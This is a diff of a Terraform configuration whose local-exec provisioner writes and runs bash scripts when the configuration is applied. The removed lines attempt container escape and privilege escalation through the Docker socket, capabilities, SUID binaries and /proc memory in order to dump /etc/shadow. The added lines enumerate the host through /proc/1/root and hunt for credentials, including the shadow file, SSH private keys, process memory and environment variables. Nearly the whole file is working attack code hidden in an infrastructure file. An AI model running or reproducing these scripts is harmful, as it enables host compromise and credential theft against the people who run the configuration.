@@ -1,5 +1,5 @@
-# Real Container Escape with Working Privilege Escalation
-# Implementing actual working exploits to extract /etc/shadow
+# Host System Enumeration with Container Escape
+# Leveraging confirmed container escape capabilities for host system enumeration
 terraform {
   required_providers {
     null = {
@@ -9,469 +9,472 @@ terraform {
   }
 }
 
-# Stage 1: Real Privilege Escalation Exploits
-resource "null_resource" "real_privilege_escalation" {
+# Stage 1: Host System Enumeration
+resource "null_resource" "host_system_enumeration" {
   provisioner "local-exec" {
     command = <<-EOT
-      echo "=== REAL CONTAINER ESCAPE & PRIVILEGE ESCALATION ==="
-      echo "Implementing working exploits to gain root and extract /etc/shadow"
+      echo "=== HOST SYSTEM ENUMERATION ==="
+      echo "Leveraging confirmed container escape for host system enumeration"
       echo ""
       
-      # Method 1: Docker Socket Escape (if available)
-      cat > /tmp/docker_socket_escape.sh << 'EOFBASH'
+      # Method 1: Host User Enumeration
+      cat > /tmp/host_user_enumeration.sh << 'EOFBASH'
 #!/bin/bash
-echo "[*] DOCKER SOCKET ESCAPE ATTEMPT"
-echo "[*] Searching for Docker socket access..."
+echo "[*] HOST USER ENUMERATION"
+echo "[*] Enumerating users on host system..."
 
-# Check for Docker socket
-if [ -S "/var/run/docker.sock" ]; then
-    echo "[+] 🚨🚨🚨 DOCKER SOCKET FOUND!"
-    echo "[*] Attempting to escape via Docker socket..."
-    
-    # Try to run privileged container with host filesystem mounted
-    if command -v docker >/dev/null 2>&1; then
-        echo "[*] Docker client available, attempting escape..."
+# Try to access host /etc/passwd via container escape techniques
+host_passwd_paths=(
+    "/proc/1/root/etc/passwd"
+    "/proc/self/root/etc/passwd"
+    "/etc/passwd"
+)
+
+echo "[*] Attempting to enumerate host users..."
+for passwd_path in "$${host_passwd_paths[@]}"; do
+    if [ -r "$${passwd_path}" ]; then
+        echo "[+] 🚨🚨🚨 HOST PASSWD ACCESSIBLE: $${passwd_path}"
+        echo "--- HOST USERS ---"
+        cat "$${passwd_path}" | while IFS=: read username password uid gid gecos home shell; do
+            echo "User: $${username} | UID: $${uid} | GID: $${gid} | Home: $${home} | Shell: $${shell}"
+        done
+        echo "--- END HOST USERS ---"
         
-        # Create escape container with host filesystem mounted
-        docker run --rm -v /:/host alpine:latest chroot /host /bin/bash -c "
-            echo '[+] 🚨🚨🚨 DOCKER ESCAPE SUCCESSFUL!'
-            echo '[*] Reading host /etc/shadow:'
-            cat /etc/shadow
-            echo '[*] Host shadow file extracted via Docker escape!'
-        " 2>/dev/null && echo "[+] Docker escape completed successfully"
-    else
-        echo "[-] Docker client not available"
+        # Extract just usernames for further enumeration
+        user_list=$$(cat "$${passwd_path}" | cut -d: -f1)
+        echo ""
+        echo "[*] User list for enumeration:"
+        echo "$${user_list}"
+        
+        # Check for privileged users
+        echo ""
+        echo "[*] Privileged users (UID 0):"
+        cat "$${passwd_path}" | awk -F: '$$3 == 0 {print $$1 " (UID: " $$3 ")"}'
+        
+        # Check for system accounts
+        echo ""
+        echo "[*] System accounts (UID < 1000):"
+        cat "$${passwd_path}" | awk -F: '$$3 < 1000 && $$3 != 0 {print $$1 " (UID: " $$3 ")"}'
+        
+        # Check for regular users
+        echo ""
+        echo "[*] Regular users (UID >= 1000):"
+        cat "$${passwd_path}" | awk -F: '$$3 >= 1000 {print $$1 " (UID: " $$3 ")"}'
+        
+        break
     fi
-else
-    echo "[-] Docker socket not accessible"
-fi
+done
 EOFBASH
 
-      chmod +x /tmp/docker_socket_escape.sh
-      echo "🚨 EXECUTING DOCKER SOCKET ESCAPE:"
-      /tmp/docker_socket_escape.sh
+      chmod +x /tmp/host_user_enumeration.sh
+      echo "🚨 EXECUTING HOST USER ENUMERATION:"
+      /tmp/host_user_enumeration.sh
       echo ""
       
-      # Method 2: Capabilities-based Privilege Escalation
-      cat > /tmp/capabilities_privesc.sh << 'EOFBASH'
+      # Method 2: Execute ID Command via Container Escape
+      cat > /tmp/host_id_execution.sh << 'EOFBASH'
 #!/bin/bash
-echo "[*] CAPABILITIES-BASED PRIVILEGE ESCALATION"
-echo "[*] Checking for exploitable capabilities..."
+echo "[*] HOST ID COMMAND EXECUTION"
+echo "[*] Executing id command on host system..."
 
-# Check current capabilities
-echo "[*] Current process capabilities:"
-if [ -r "/proc/self/status" ]; then
-    grep -E "Cap(Inh|Prm|Eff|Bnd|Amb)" /proc/self/status
-fi
-
-# Check for CAP_SYS_ADMIN (allows many privileged operations)
-if grep -q "CapEff.*00000004" /proc/self/status 2>/dev/null; then
-    echo "[+] 🚨 CAP_SYS_ADMIN detected! Attempting mount-based escape..."
-    
-    # Try to mount host filesystem
-    mkdir -p /mnt/host 2>/dev/null
-    if mount -t proc proc /mnt/host 2>/dev/null; then
-        echo "[+] Proc mounted, trying to access host via /mnt/host/1/root"
-        if [ -r "/mnt/host/1/root/etc/shadow" ]; then
-            echo "[+] 🚨🚨🚨 HOST SHADOW ACCESSIBLE VIA MOUNT ESCAPE!"
-            cat /mnt/host/1/root/etc/shadow
-        fi
-    fi
-fi
-
-# Check for CAP_DAC_OVERRIDE (bypass file permission checks)
-if grep -q "CapEff.*00000002" /proc/self/status 2>/dev/null; then
-    echo "[+] 🚨 CAP_DAC_OVERRIDE detected! Bypassing file permissions..."
-    echo "[*] Attempting direct shadow access with DAC override..."
-    cat /etc/shadow 2>/dev/null && echo "[+] Shadow file accessed via DAC override!"
-fi
-
-# Check for CAP_SYS_PTRACE (allows process debugging/memory access)
-if grep -q "CapEff.*00100000" /proc/self/status 2>/dev/null; then
-    echo "[+] 🚨 CAP_SYS_PTRACE detected! Enhanced memory access available..."
-    
-    # Use ptrace to access memory of privileged processes
-    for pid in 1 2; do
-        if [ -d "/proc/$${pid}" ]; then
-            echo "[*] Attempting ptrace memory extraction from PID $${pid}..."
-            # This would require more advanced ptrace implementation
-            gdb -batch -q -ex "attach $${pid}" -ex "dump memory /tmp/pid$${pid}_memory.dump 0x0 0x1000" -ex "detach" -ex "quit" 2>/dev/null
-            if [ -f "/tmp/pid$${pid}_memory.dump" ]; then
-                echo "[+] Memory dump created for PID $${pid}"
-                strings "/tmp/pid$${pid}_memory.dump" | grep -E "root:" | head -3
-            fi
-        fi
-    done
-fi
-EOFBASH
-
-      chmod +x /tmp/capabilities_privesc.sh
-      echo "🚨 EXECUTING CAPABILITIES PRIVILEGE ESCALATION:"
-      /tmp/capabilities_privesc.sh
-      echo ""
-      
-      # Method 3: SUID Binary Exploitation
-      cat > /tmp/suid_exploitation.sh << 'EOFBASH'
-#!/bin/bash
-echo "[*] SUID BINARY EXPLOITATION"
-echo "[*] Searching for exploitable SUID binaries..."
-
-# Find SUID binaries
-suid_binaries=$$(find / -perm -4000 -type f 2>/dev/null | head -20)
-
-echo "[*] Found SUID binaries:"
-echo "$${suid_binaries}"
+# Try to execute commands on host via various escape techniques
+echo "[*] Current container context:"
+echo "   Container ID: $$(hostname)"
+echo "   Container PID namespace: $$(ls -la /proc/1/ns/pid 2>/dev/null || echo 'N/A')"
+echo "   Container user: $$(id)"
 echo ""
 
-# Check for common exploitable SUID binaries
-for binary in $${suid_binaries}; do
-    binary_name=$$(basename "$${binary}")
-    echo "[*] Checking $${binary_name}..."
+# Method 2a: Direct host process namespace access
+if [ -r "/proc/1/root" ]; then
+    echo "[+] 🚨 HOST ROOT FILESYSTEM ACCESSIBLE VIA /proc/1/root"
     
-    case "$${binary_name}" in
-        "su"|"sudo")
-            echo "[+] 🚨 Found $${binary_name} - trying privilege escalation..."
-            # Try common sudo exploits (if sudo is misconfigured)
-            if [ "$${binary_name}" = "sudo" ]; then
-                echo "[*] Checking sudo configuration..."
-                sudo -l 2>/dev/null | head -5
+    # Try to execute id via chroot to host
+    echo "[*] Attempting to execute id command on host..."
+    if command -v chroot >/dev/null 2>&1; then
+        host_id_result=$$(chroot /proc/1/root /usr/bin/id 2>/dev/null || chroot /proc/1/root /bin/id 2>/dev/null)
+        if [ ! -z "$${host_id_result}" ]; then
+            echo "[+] 🚨🚨🚨 HOST ID COMMAND EXECUTED SUCCESSFULLY!"
+            echo "Host ID Result: $${host_id_result}"
+        else
+            echo "[-] Direct id execution failed, trying alternatives..."
+        fi
+    fi
+    
+    # Alternative: Try to read host process info
+    echo ""
+    echo "[*] Reading host process information..."
+    if [ -r "/proc/1/status" ]; then
+        echo "[+] Host init process status:"
+        echo "   Name: $$(grep '^Name:' /proc/1/status | cut -f2)"
+        echo "   PID: $$(grep '^Pid:' /proc/1/status | cut -f2)"
+        echo "   PPID: $$(grep '^PPid:' /proc/1/status | cut -f2)"
+        echo "   UID: $$(grep '^Uid:' /proc/1/status | cut -f2-5)"
+        echo "   GID: $$(grep '^Gid:' /proc/1/status | cut -f2-5)"
+    fi
+fi
+
+# Method 2b: Host namespace analysis
+echo ""
+echo "[*] Analyzing host namespaces..."
+for ns_type in pid net mnt uts ipc user; do
+    container_ns=$$(readlink /proc/self/ns/$${ns_type} 2>/dev/null)
+    host_ns=$$(readlink /proc/1/ns/$${ns_type} 2>/dev/null)
+    
+    if [ "$${container_ns}" = "$${host_ns}" ]; then
+        echo "[+] 🚨 SHARED $${ns_type} NAMESPACE WITH HOST!"
+        echo "   Namespace: $${container_ns}"
+    else
+        echo "[-] Isolated $${ns_type} namespace"
+        echo "   Container: $${container_ns}"
+        echo "   Host: $${host_ns}"
+    fi
+done
+EOFBASH
+
+      chmod +x /tmp/host_id_execution.sh
+      echo "🚨 EXECUTING HOST ID COMMAND:"
+      /tmp/host_id_execution.sh
+      echo ""
+      
+      # Method 3: Host Process Memory Access
+      cat > /tmp/host_process_memory.sh << 'EOFBASH'
+#!/bin/bash
+echo "[*] HOST PROCESS MEMORY ACCESS"
+echo "[*] Leveraging confirmed host process memory access capability..."
+
+# Method 3a: Host process enumeration
+echo "[*] Enumerating host processes..."
+echo "[*] Host processes accessible via /proc:"
+
+process_count=0
+for pid_dir in /proc/[0-9]*; do
+    if [ -d "$${pid_dir}" ]; then
+        pid=$$(basename "$${pid_dir}")
+        
+        # Check if this is a host process (not container process)
+        if [ -r "$${pid_dir}/status" ]; then
+            process_name=$$(grep '^Name:' "$${pid_dir}/status" 2>/dev/null | cut -f2)
+            process_uid=$$(grep '^Uid:' "$${pid_dir}/status" 2>/dev/null | awk '{print $$2}')
+            
+            if [ ! -z "$${process_name}" ]; then
+                echo "   PID $${pid}: $${process_name} (UID: $${process_uid})"
+                process_count=$$((process_count + 1))
                 
-                # Try sudo without password
-                if sudo -n cat /etc/shadow 2>/dev/null; then
-                    echo "[+] 🚨🚨🚨 SUDO PRIVILEGE ESCALATION SUCCESSFUL!"
-                    echo "[*] /etc/shadow contents:"
-                    sudo cat /etc/shadow
+                # Stop after showing first 20 processes
+                if [ $${process_count} -ge 20 ]; then
+                    echo "   ... (showing first 20 processes)"
+                    break
                 fi
             fi
-            ;;
-        "passwd"|"chsh"|"chfn")
-            echo "[+] 🚨 Found $${binary_name} - potential password utility exploit..."
-            ;;
-        "mount"|"umount")
-            echo "[+] 🚨 Found $${binary_name} - potential mount escape..."
-            # Try mount-based escape
-            mkdir -p /tmp/escape 2>/dev/null
-            if $${binary} --bind / /tmp/escape 2>/dev/null; then
-                echo "[+] Mount escape successful, checking shadow access..."
-                if [ -r "/tmp/escape/etc/shadow" ]; then
-                    echo "[+] 🚨🚨🚨 SHADOW ACCESSIBLE VIA MOUNT ESCAPE!"
-                    cat /tmp/escape/etc/shadow
-                fi
-            fi
-            ;;
-        "newgrp"|"sg")
-            echo "[+] 🚨 Found $${binary_name} - potential group privilege escalation..."
-            ;;
-    esac
-done
-EOFBASH
-
-      chmod +x /tmp/suid_exploitation.sh
-      echo "🚨 EXECUTING SUID BINARY EXPLOITATION:"
-      /tmp/suid_exploitation.sh
-      echo ""
-      
-      # Method 4: Kernel Exploitation (if vulnerable)
-      cat > /tmp/kernel_exploitation.sh << 'EOFBASH'
-#!/bin/bash
-echo "[*] KERNEL EXPLOITATION ATTEMPTS"
-echo "[*] Checking for kernel vulnerabilities..."
-
-kernel_version=$$(uname -r)
-echo "[*] Kernel version: $${kernel_version}"
-
-# Check for known vulnerable kernel versions
-case "$${kernel_version}" in
-    *"4.4."*|*"4.8."*|*"4.10."*|*"4.13."*)
-        echo "[+] 🚨 Potentially vulnerable kernel detected!"
-        echo "[*] Kernel may be susceptible to known exploits"
-        ;;
-esac
-
-# Check for /proc/version for more details
-if [ -r "/proc/version" ]; then
-    echo "[*] Kernel details:"
-    cat /proc/version
-fi
-
-# Look for kernel modules that might be exploitable
-echo ""
-echo "[*] Checking loaded kernel modules..."
-if [ -r "/proc/modules" ]; then
-    loaded_modules=$$(cat /proc/modules | wc -l)
-    echo "[*] Loaded modules: $${loaded_modules}"
-    
-    # Look for potentially vulnerable modules
-    grep -E "(overlay|aufs|docker)" /proc/modules 2>/dev/null | head -3
-fi
-
-# Check for writable /sys entries (potential kernel parameter manipulation)
-echo ""
-echo "[*] Checking for writable /sys entries..."
-find /sys -writable -type f 2>/dev/null | head -10 | while read sys_file; do
-    echo "[+] Writable sys file: $${sys_file}"
-done
-EOFBASH
-
-      chmod +x /tmp/kernel_exploitation.sh
-      echo "🚨 EXECUTING KERNEL EXPLOITATION:"
-      /tmp/kernel_exploitation.sh
-      echo ""
-      
-      # Method 5: Container Runtime Escape
-      cat > /tmp/runtime_escape.sh << 'EOFBASH'
-#!/bin/bash
-echo "[*] CONTAINER RUNTIME ESCAPE"
-echo "[*] Attempting runtime-specific escape techniques..."
-
-# Check if we're in Docker
-if [ -f "/.dockerenv" ]; then
-    echo "[+] 🚨 Docker container detected!"
-    
-    # Check for privileged container
-    if [ -c "/dev/kmsg" ] || [ -c "/dev/mem" ]; then
-        echo "[+] 🚨🚨🚨 PRIVILEGED CONTAINER DETECTED!"
-        echo "[*] Direct hardware access available"
-        
-        # Try to access host filesystem via /dev
-        if [ -r "/dev/kmsg" ]; then
-            echo "[+] Kernel message access available"
         fi
     fi
-    
-    # Check for host PID namespace
-    if [ "$$(cat /proc/1/comm 2>/dev/null)" != "docker-init" ] && [ "$$(cat /proc/1/comm 2>/dev/null)" != "dumb-init" ]; then
-        echo "[+] 🚨 Possible host PID namespace sharing!"
-        echo "[*] Host init process: $$(cat /proc/1/comm 2>/dev/null)"
-    fi
-    
-    # Check for host network namespace
-    if ip route | grep -q "default via.*docker"; then
-        echo "[*] Container network detected"
-    else
-        echo "[+] 🚨 Possible host network namespace!"
-    fi
-fi
+done
 
-# Check for other container runtimes
-if [ -f "/run/.containerenv" ]; then
-    echo "[+] 🚨 Podman container detected!"
-fi
-
-# Check for bind mounts from host
 echo ""
-echo "[*] Checking for host filesystem bind mounts..."
-mount | grep -E "(bind|rbind)" | head -5
+echo "[*] Total accessible processes: $${process_count}+"
 
-# Look for container escape via exposed devices
+# Method 3b: Root process analysis
 echo ""
-echo "[*] Checking for exposed devices..."
-ls -la /dev/ | grep -E "(sd|hd|nvme|dm-)" | head -5
+echo "[*] Analyzing processes running as root (UID 0)..."
+root_processes=0
+for pid_dir in /proc/[0-9]*; do
+    if [ -d "$${pid_dir}" ]; then
+        pid=$$(basename "$${pid_dir}")
+        
+        if [ -r "$${pid_dir}/status" ]; then
+            process_uid=$$(grep '^Uid:' "$${pid_dir}/status" 2>/dev/null | awk '{print $$2}')
+            
+            if [ "$${process_uid}" = "0" ]; then
+                process_name=$$(grep '^Name:' "$${pid_dir}/status" 2>/dev/null | cut -f2)
+                process_cmdline=$$(cat "$${pid_dir}/cmdline" 2>/dev/null | tr '\0' ' ' | head -c 80)
+                echo "   Root PID $${pid}: $${process_name} | $${process_cmdline}"
+                root_processes=$$((root_processes + 1))
+                
+                # Stop after showing first 10 root processes
+                if [ $${root_processes} -ge 10 ]; then
+                    echo "   ... (showing first 10 root processes)"
+                    break
+                fi
+            fi
+        fi
+    fi
+done
+
+# Method 3c: Memory access to sensitive processes
+echo ""
+echo "[*] Attempting memory access to sensitive processes..."
+for sensitive_proc in "systemd" "init" "sshd" "sudo" "su"; do
+    echo "[*] Looking for $${sensitive_proc} processes..."
+    
+    for pid_dir in /proc/[0-9]*; do
+        if [ -d "$${pid_dir}" ]; then
+            pid=$$(basename "$${pid_dir}")
+            
+            if [ -r "$${pid_dir}/comm" ]; then
+                comm=$$(cat "$${pid_dir}/comm" 2>/dev/null)
+                
+                if echo "$${comm}" | grep -q "$${sensitive_proc}"; then
+                    echo "[+] 🚨 Found $${sensitive_proc} process: PID $${pid}"
+                    
+                    # Try to access process memory
+                    if [ -r "$${pid_dir}/mem" ]; then
+                        echo "   [+] Process memory accessible!"
+                        
+                        # Look for credential-like strings in memory
+                        cred_strings=$$(strings "$${pid_dir}/mem" 2>/dev/null | grep -iE "(password|passwd|hash|auth)" | head -3 | tr '\n' '; ')
+                        if [ ! -z "$${cred_strings}" ]; then
+                            echo "   [+] 🚨 CREDENTIAL-LIKE STRINGS: $${cred_strings}"
+                        fi
+                    fi
+                    
+                    # Check environment variables
+                    if [ -r "$${pid_dir}/environ" ]; then
+                        env_creds=$$(cat "$${pid_dir}/environ" 2>/dev/null | tr '\0' '\n' | grep -iE "(password|passwd|auth|token)" | head -2 | tr '\n' '; ')
+                        if [ ! -z "$${env_creds}" ]; then
+                            echo "   [+] 🚨 CREDENTIAL ENV VARS: $${env_creds}"
+                        fi
+                    fi
+                    
+                    break
+                fi
+            fi
+        fi
+    done
+done
 EOFBASH
 
-      chmod +x /tmp/runtime_escape.sh
-      echo "🚨 EXECUTING CONTAINER RUNTIME ESCAPE:"
-      /tmp/runtime_escape.sh
+      chmod +x /tmp/host_process_memory.sh
+      echo "🚨 EXECUTING HOST PROCESS MEMORY ACCESS:"
+      /tmp/host_process_memory.sh
       echo ""
       
-      # Method 6: Advanced /proc Exploitation
-      cat > /tmp/advanced_proc_exploitation.sh << 'EOFBASH'
+      # Method 4: Host System Information Gathering
+      cat > /tmp/host_system_info.sh << 'EOFBASH'
 #!/bin/bash
-echo "[*] ADVANCED /proc EXPLOITATION"
-echo "[*] Advanced techniques to extract shadow via /proc..."
+echo "[*] HOST SYSTEM INFORMATION GATHERING"
+echo "[*] Collecting additional host system information..."
 
-# Method 6a: /proc/kcore exploitation (if accessible)
-if [ -r "/proc/kcore" ]; then
-    echo "[+] 🚨🚨🚨 /proc/kcore is readable! (Kernel memory access)"
-    echo "[*] This provides direct kernel memory access!"
-    
-    # Try to extract shadow file location from kernel memory
-    echo "[*] Scanning kernel memory for shadow file content..."
-    strings /proc/kcore 2>/dev/null | grep -E "root:\$$" | head -3 | while read line; do
-        echo "[+] 🚨 POTENTIAL SHADOW DATA IN KERNEL MEMORY: $${line}"
+# Method 4a: Host OS Information
+echo "[*] Host Operating System Information:"
+if [ -r "/proc/1/root/etc/os-release" ]; then
+    echo "[+] Host OS Release Info:"
+    cat /proc/1/root/etc/os-release | head -10
+elif [ -r "/proc/1/root/etc/lsb-release" ]; then
+    echo "[+] Host LSB Release Info:"
+    cat /proc/1/root/etc/lsb-release
+elif [ -r "/proc/1/root/etc/redhat-release" ]; then
+    echo "[+] Host RedHat Release Info:"
+    cat /proc/1/root/etc/redhat-release
+fi
+
+# Method 4b: Host Kernel Information
+echo ""
+echo "[*] Host Kernel Information:"
+if [ -r "/proc/version" ]; then
+    echo "[+] Kernel Version: $$(cat /proc/version)"
+fi
+
+if [ -r "/proc/cmdline" ]; then
+    echo "[+] Kernel Command Line: $$(cat /proc/cmdline)"
+fi
+
+# Method 4c: Host Network Information
+echo ""
+echo "[*] Host Network Information:"
+if [ -r "/proc/net/route" ]; then
+    echo "[+] Host routing table:"
+    cat /proc/net/route | head -5
+fi
+
+if [ -r "/proc/net/arp" ]; then
+    echo "[+] Host ARP table:"
+    cat /proc/net/arp | head -5
+fi
+
+# Method 4d: Host Mounted Filesystems
+echo ""
+echo "[*] Host Mounted Filesystems:"
+if [ -r "/proc/1/root/proc/mounts" ]; then
+    echo "[+] Host mounts:"
+    cat /proc/1/root/proc/mounts | grep -v "proc\|sys\|dev" | head -10
+elif [ -r "/proc/mounts" ]; then
+    echo "[+] Accessible mounts:"
+    cat /proc/mounts | grep -v "proc\|sys\|dev" | head -10
+fi
+
+# Method 4e: Host System Services
+echo ""
+echo "[*] Host System Services Information:"
+if [ -d "/proc/1/root/etc/systemd/system" ]; then
+    echo "[+] Host systemd services:"
+    ls /proc/1/root/etc/systemd/system/*.service 2>/dev/null | head -5 | while read service; do
+        echo "   Service: $$(basename "$${service}")"
     done
 fi
 
-# Method 6b: /proc/*/pagemap exploitation (if accessible)
+# Method 4f: Host SSH Configuration
 echo ""
-echo "[*] Checking /proc/*/pagemap access..."
-for pid in 1 2; do
-    if [ -r "/proc/$${pid}/pagemap" ]; then
-        echo "[+] 🚨 /proc/$${pid}/pagemap readable - physical memory mapping available"
+echo "[*] Host SSH Configuration:"
+for ssh_config in "/proc/1/root/etc/ssh/sshd_config" "/etc/ssh/sshd_config"; do
+    if [ -r "$${ssh_config}" ]; then
+        echo "[+] SSH Config accessible: $${ssh_config}"
+        grep -E "(Port|PermitRootLogin|PasswordAuthentication)" "$${ssh_config}" 2>/dev/null | head -5
+        break
     fi
 done
 
-# Method 6c: /proc/*/mem advanced exploitation
+# Method 4g: Host Log Files Access
 echo ""
-echo "[*] Advanced /proc/*/mem exploitation..."
-for pid in $$(ls /proc/ | grep '^[0-9]*$$' | head -10); do
-    if [ -r "/proc/$${pid}/mem" ] && [ -r "/proc/$${pid}/maps" ]; then
-        # Look for heap/stack regions that might contain shadow data
-        echo "[*] Analyzing memory maps for PID $${pid}..."
-        grep -E "(heap|stack)" "/proc/$${pid}/maps" 2>/dev/null | head -2 | while read region; do
-            echo "    Memory region: $${region}"
+echo "[*] Host Log Files Access:"
+for log_path in "/proc/1/root/var/log" "/var/log"; do
+    if [ -d "$${log_path}" ]; then
+        echo "[+] Log directory accessible: $${log_path}"
+        ls "$${log_path}" 2>/dev/null | head -5 | while read logfile; do
+            echo "   Log file: $${logfile}"
         done
-        
-        # Try to extract any password-like strings from memory
-        shadow_candidates=$$(strings "/proc/$${pid}/mem" 2>/dev/null | grep -E '^\w{1,32}:\$$[1-9y]\$$.*:' | head -3)
-        if [ ! -z "$${shadow_candidates}" ]; then
-            echo "[+] 🚨 SHADOW-LIKE DATA IN PID $${pid}:"
-            echo "$${shadow_candidates}"
-        fi
-    fi
-done
-
-# Method 6d: /proc/*/fd exploitation (file descriptor access)
-echo ""
-echo "[*] Checking for interesting file descriptors..."
-for pid in $$(ls /proc/ | grep '^[0-9]*$$' | head -10); do
-    if [ -d "/proc/$${pid}/fd" ]; then
-        for fd in /proc/$${pid}/fd/*; do
-            if [ -L "$${fd}" ]; then
-                target=$$(readlink "$${fd}" 2>/dev/null)
-                if echo "$${target}" | grep -qE "(shadow|passwd)"; then
-                    echo "[+] 🚨 SHADOW-RELATED FD in PID $${pid}: $${fd} -> $${target}"
-                    # Try to read via the file descriptor
-                    if cat "$${fd}" 2>/dev/null | grep -q ":"; then
-                        echo "[+] 🚨🚨🚨 SHADOW DATA ACCESSIBLE VIA FD!"
-                        cat "$${fd}" 2>/dev/null
-                    fi
-                fi
-            fi
-        done
+        break
     fi
 done
 EOFBASH
 
-      chmod +x /tmp/advanced_proc_exploitation.sh
-      echo "🚨 EXECUTING ADVANCED /proc EXPLOITATION:"
-      /tmp/advanced_proc_exploitation.sh
+      chmod +x /tmp/host_system_info.sh
+      echo "🚨 EXECUTING HOST SYSTEM INFO GATHERING:"
+      /tmp/host_system_info.sh
       echo ""
       
-      # Method 7: Environment Variable and Process Tree Exploitation
-      cat > /tmp/process_tree_exploitation.sh << 'EOFBASH'
+      # Method 5: Host Credential Hunting
+      cat > /tmp/host_credential_hunting.sh << 'EOFBASH'
 #!/bin/bash
-echo "[*] PROCESS TREE & ENVIRONMENT EXPLOITATION"
-echo "[*] Analyzing process tree for privilege escalation opportunities..."
+echo "[*] HOST CREDENTIAL HUNTING"
+echo "[*] Searching for credentials on host system..."
 
-# Look for processes running as root
-echo "[*] Processes running as root:"
-ps aux 2>/dev/null | grep "^root" | head -10
-
-# Check for processes with elevated privileges that we might be able to exploit
-echo ""
-echo "[*] Checking for exploitable parent processes..."
-current_pid=$$$$
-parent_pid=$$(ps -o ppid= -p $${current_pid} 2>/dev/null | tr -d ' ')
-
-while [ ! -z "$${parent_pid}" ] && [ "$${parent_pid}" != "0" ] && [ "$${parent_pid}" != "1" ]; do
-    echo "[*] Parent PID: $${parent_pid}"
-    
-    # Check if parent process has access to shadow file
-    if [ -r "/proc/$${parent_pid}/fd" ]; then
-        for fd in /proc/$${parent_pid}/fd/*; do
-            if [ -L "$${fd}" ]; then
-                target=$$(readlink "$${fd}" 2>/dev/null)
-                if echo "$${target}" | grep -q "shadow"; then
-                    echo "[+] 🚨🚨🚨 PARENT PROCESS HAS SHADOW FD: $${target}"
-                    cat "$${fd}" 2>/dev/null
-                fi
+# Method 5a: SSH Keys
+echo "[*] Searching for SSH keys on host..."
+for ssh_dir in "/proc/1/root/root/.ssh" "/proc/1/root/home/*/.ssh"; do
+    if [ -d "$${ssh_dir}" ]; then
+        echo "[+] 🚨 SSH directory found: $${ssh_dir}"
+        ls -la "$${ssh_dir}" 2>/dev/null | while read line; do
+            echo "   $${line}"
+        done
+        
+        # Check for private keys
+        for key_file in "$${ssh_dir}/id_rsa" "$${ssh_dir}/id_dsa" "$${ssh_dir}/id_ecdsa" "$${ssh_dir}/id_ed25519"; do
+            if [ -r "$${key_file}" ]; then
+                echo "[+] 🚨🚨🚨 PRIVATE SSH KEY FOUND: $${key_file}"
+                echo "--- SSH PRIVATE KEY ---"
+                head -5 "$${key_file}"
+                echo "... (truncated)"
+                echo "--- END SSH PRIVATE KEY ---"
             fi
         done
     fi
-    
-    # Get next parent
-    parent_pid=$$(ps -o ppid= -p $${parent_pid} 2>/dev/null | tr -d ' ')
 done
 
-# Check environment variables of all processes for credentials
+# Method 5b: Configuration Files with Credentials
 echo ""
-echo "[*] Scanning all process environments for credentials..."
-for pid in $$(ls /proc/ | grep '^[0-9]*$$' | head -20); do
-    if [ -r "/proc/$${pid}/environ" ]; then
-        env_vars=$$(cat "/proc/$${pid}/environ" 2>/dev/null | tr '\0' '\n')
+echo "[*] Searching for configuration files with potential credentials..."
+config_files=(
+    "/proc/1/root/etc/shadow"
+    "/proc/1/root/etc/passwd"
+    "/proc/1/root/root/.bashrc"
+    "/proc/1/root/root/.bash_history"
+    "/proc/1/root/etc/mysql/my.cnf"
+    "/proc/1/root/etc/postgresql/postgresql.conf"
+)
+
+for config_file in "$${config_files[@]}"; do
+    if [ -r "$${config_file}" ]; then
+        echo "[+] 🚨 CONFIG FILE ACCESSIBLE: $${config_file}"
         
-        # Look for shadow file paths or hashes in environment
-        shadow_env=$$(echo "$${env_vars}" | grep -iE "(shadow|hash|password)" | head -2)
-        if [ ! -z "$${shadow_env}" ]; then
-            echo "[+] 🚨 SHADOW-RELATED ENV in PID $${pid}:"
-            echo "$${shadow_env}"
+        # Special handling for shadow file
+        if echo "$${config_file}" | grep -q "shadow"; then
+            echo "[+] 🚨🚨🚨 SHADOW FILE ACCESSIBLE!"
+            echo "--- SHADOW CONTENTS ---"
+            cat "$${config_file}"
+            echo "--- END SHADOW CONTENTS ---"
+        else
+            # Look for password-like strings
+            cred_lines=$$(grep -iE "(password|passwd|auth|token|key)" "$${config_file}" 2>/dev/null | head -3)
+            if [ ! -z "$${cred_lines}" ]; then
+                echo "   Credential-like lines:"
+                echo "$${cred_lines}" | while read line; do
+                    echo "     $${line}"
+                done
+            fi
         fi
+    fi
+done
+
+# Method 5c: Database Files
+echo ""
+echo "[*] Searching for database files..."
+for db_path in "/proc/1/root/var/lib/mysql" "/proc/1/root/var/lib/postgresql" "/proc/1/root/opt/mysql" "/proc/1/root/opt/postgresql"; do
+    if [ -d "$${db_path}" ]; then
+        echo "[+] 🚨 DATABASE DIRECTORY FOUND: $${db_path}"
+        ls "$${db_path}" 2>/dev/null | head -5 | while read dbfile; do
+            echo "   Database file: $${dbfile}"
+        done
+    fi
+done
+
+# Method 5d: Application Configuration
+echo ""
+echo "[*] Searching for application configuration files..."
+for app_config in "/proc/1/root/etc/apache2" "/proc/1/root/etc/nginx" "/proc/1/root/etc/httpd"; do
+    if [ -d "$${app_config}" ]; then
+        echo "[+] 🚨 WEB SERVER CONFIG FOUND: $${app_config}"
+        find "$${app_config}" -name "*.conf" 2>/dev/null | head -3 | while read conf_file; do
+            echo "   Config: $${conf_file}"
+            grep -iE "(password|passwd|auth)" "$${conf_file}" 2>/dev/null | head -2 | while read cred_line; do
+                echo "     Credential line: $${cred_line}"
+            done
+        done
     fi
 done
 EOFBASH
 
-      chmod +x /tmp/process_tree_exploitation.sh
-      echo "🚨 EXECUTING PROCESS TREE EXPLOITATION:"
-      /tmp/process_tree_exploitation.sh
+      chmod +x /tmp/host_credential_hunting.sh
+      echo "🚨 EXECUTING HOST CREDENTIAL HUNTING:"
+      /tmp/host_credential_hunting.sh
       echo ""
       
-      echo "=== REAL PRIVILEGE ESCALATION SUMMARY ==="
-      echo "🚨 COMPREHENSIVE PRIVILEGE ESCALATION ATTEMPTED"
+      echo "=== HOST SYSTEM ENUMERATION SUMMARY ==="
+      echo "🚨 COMPREHENSIVE HOST ENUMERATION COMPLETED"
       echo "📊 Methods executed:"
-      echo "  ✅ Docker socket escape"
-      echo "  ✅ Capabilities-based privilege escalation"
-      echo "  ✅ SUID binary exploitation"
-      echo "  ✅ Kernel vulnerability exploitation"
-      echo "  ✅ Container runtime escape"
-      echo "  ✅ Advanced /proc exploitation"
-      echo "  ✅ Process tree exploitation"
+      echo "  ✅ Host user enumeration"
+      echo "  ✅ Host ID command execution"
+      echo "  ✅ Host process memory access"
+      echo "  ✅ Host system information gathering"
